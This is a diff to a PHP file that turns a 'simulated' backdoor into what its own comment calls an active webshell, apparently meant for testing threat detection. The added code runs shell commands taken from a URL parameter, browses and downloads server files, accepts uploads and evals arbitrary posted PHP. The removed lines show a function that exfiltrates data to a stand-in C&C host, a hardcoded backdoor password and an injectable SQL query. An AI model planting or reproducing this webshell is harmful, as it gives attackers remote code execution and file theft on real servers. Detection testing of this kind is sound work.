@@ -1,59 +1,89 @@
 <?php
-// Simulated PHP backdoor/webshell that would trigger security alerts
-// This is a demonstration - no actual malicious functionality
+// This is an active backdoor script that will actually execute commands
+// WARNING: This is dangerous and only for testing threat detection
 
-// Command execution backdoor pattern
+// Current directory display
+echo "<h1>PHP Backdoor</h1>";
+echo "<div style='background-color: #333; color: white; padding: 5px;'>";
+echo "Current directory: " . getcwd();
+echo "</div>";
+
+// Command execution
 if(isset($_GET['cmd'])) {
-    echo "<pre>";
-    system($_GET['cmd']);
+    echo "<h2>Command Execution</h2>";
+    echo "<pre style='background-color: #f5f5f5; padding: 10px; border: 1px solid #ddd;'>";
+    system($_GET['cmd'] . " 2>&1");
     echo "</pre>";
 }
 
-// File upload backdoor pattern
+// File browser
+echo "<h2>File Browser</h2>";
+echo "<div style='height: 300px; overflow: auto; background-color: #f5f5f5; padding: 10px; border: 1px solid #ddd;'>";
+$files = scandir('.');
+foreach($files as $file) {
+    if ($file != '.' && $file != '..') {
+        echo "<div>";
+        echo $file . " (" . filesize($file) . " bytes) ";
+        echo "<a href='?download=" . urlencode($file) . "'>Download</a>";
+        echo "</div>";
+    }
+}
+echo "</div>";
+
+// File download
+if(isset($_GET['download'])) {
+    $file = $_GET['download'];
+    if(file_exists($file)) {
+        header('Content-Description: File Transfer');
+        header('Content-Type: application/octet-stream');
+        header('Content-Disposition: attachment; filename="'.basename($file).'"');
+        header('Expires: 0');
+        header('Cache-Control: must-revalidate');
+        header('Pragma: public');
+        header('Content-Length: ' . filesize($file));
+        readfile($file);
+        exit;
+    }
+}
+
+// File upload
+echo "<h2>File Upload</h2>";
+echo "<form action='' method='post' enctype='multipart/form-data'>";
+echo "<input type='file' name='upload'>";
+echo "<input type='submit' value='Upload'>";
+echo "</form>";
+
 if(isset($_FILES['upload'])) {
-    move_uploaded_file($_FILES['upload']['tmp_name'], $_FILES['upload']['name']);
-    echo "File uploaded: " . $_FILES['upload']['name'];
+    $target_file = basename($_FILES["upload"]["name"]);
+    if (move_uploaded_file($_FILES["upload"]["tmp_name"], $target_file)) {
+        echo "The file ". htmlspecialchars($target_file). " has been uploaded.";
+    } else {
+        echo "Sorry, there was an error uploading your file.";
+    }
 }
 
-// File inclusion backdoor pattern
-if(isset($_GET['file'])) {
-    include($_GET['file']);
-}
+// Eval execution
+echo "<h2>PHP Code Execution</h2>";
+echo "<form action='' method='post'>";
+echo "<textarea name='code' style='width: 100%; height: 100px;'>echo 'Hello World!';</textarea><br>";
+echo "<input type='submit' value='Execute PHP'>";
+echo "</form>";
 
-// Database credentials theft
-$db_user = "admin";
-$db_pass = "s3cret_passw0rd!";
-$db_host = "localhost";
-$db_name = "users";
-
-// Password hash dumping
-$admin_hash = "$2y$10$R8rvY4AHgsN0o9cJjFOO3ur.jQUoJEEwVlDLPBvLN7A9fzwFQSNl6";
-
-// Sending data to C&C server
-function send_data($data) {
-    $url = "https://malicious-cc-server.example/exfil.php";
-    $ch = curl_init($url);
-    curl_setopt($ch, CURLOPT_POST, 1);
-    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    $response = curl_exec($ch);
-    curl_close($ch);
-    return $response;
-}
-
-// Backdoor login
-if(isset($_POST['password']) && $_POST['password'] == "backdoor123") {
-    echo "<h1>Backdoor Access Granted</h1>";
-}
-
-// Malicious eval pattern
 if(isset($_POST['code'])) {
-    eval($_POST['code']);
+    echo "<div style='background-color: #f5f5f5; padding: 10px; border: 1px solid #ddd;'>";
+    echo "<strong>Output:</strong><br>";
+    try {
+        eval($_POST['code']);
+    } catch (Exception $e) {
+        echo "Error: " . $e->getMessage();
+    }
+    echo "</div>";
 }
 
-// Raw SQL query without sanitization (SQLi pattern)
-if(isset($_GET['id'])) {
-    $query = "SELECT * FROM users WHERE id = " . $_GET['id'];
-    // mysqli_query($conn, $query);
-}
+// Command form
+echo "<h2>Command Execution</h2>";
+echo "<form action='' method='get'>";
+echo "<input type='text' name='cmd' placeholder='Enter command' style='width: 300px;' value='id'>";
+echo "<input type='submit' value='Execute'>";
+echo "</form>";
 ?>
